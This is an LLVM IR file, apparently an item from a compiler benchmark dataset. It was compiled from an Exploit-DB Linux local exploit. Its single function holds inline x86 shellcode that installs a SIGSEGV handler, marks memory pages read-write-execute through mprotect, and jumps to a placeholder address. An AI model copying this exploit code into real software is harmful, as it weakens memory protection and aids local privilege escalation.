; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_624.c_bad_code.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_624.c_bad_code.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@llvm.used = appending global [1 x i8*] [i8* bitcast (void ()* @bad_code to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @bad_code() #0 {
  call void asm sideeffect " xorl %edi, %edi \0A movl %esp, %esi \0A xorl %edx, %edx \0A xorl %ebp, %ebp \0A call get_addr \0A movl %esi, %esp \0A movl %edi, %ebp \0A jmp inst_sig \0Aget_addr: popl %ecx \0Ainst_sig: xorl %eax, %eax \0A movl $$11, %ebx \0A movb $$48, %al \0A int $$0x80 \0Ald_page: movl %ebp, %eax \0A subl %edx, %eax \0A cmpl $$0x1000, %eax \0A jle ld_page2 \0A pusha \0A movl %edx, %ebx \0A addl $$0x1000, %ebx \0A movl %eax, %ecx \0A xorl %eax, %eax \0A movb $$125, %al \0A movl $$7, %edx \0A int $$0x80 \0A popa \0Ald_page2: addl $$0x1000, %edi \0A cmpl $$0xc0000000, %edi \0A je dump \0A movl %ebp, %edx \0A movl (%edi), %eax \0A jmp ld_page \0Adump: xorl %eax, %eax \0A xorl %ecx, %ecx \0A movl $$11, %ebx \0A movb $$48, %al \0A int $$0x80 \0A movl $$0xdeadbeef, %eax \0A jmp *(%eax) \0A", "~{dirflag},~{fpsr},~{flags}"() #1, !srcloc !2
  ret void
}

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 219, i32 258, i32 296, i32 334, i32 372, i32 409, i32 447, i32 485, i32 521, i32 564, i32 611, i32 648, i32 684, i32 717, i32 763, i32 801, i32 842, i32 879, i32 907, i32 945, i32 986, i32 1024, i32 1062, i32 1099, i32 1135, i32 1167, i32 1195, i32 1245, i32 1290, i32 1320, i32 1358, i32 1398, i32 1433, i32 1476, i32 1514, i32 1551, i32 1587, i32 1619, i32 1664}
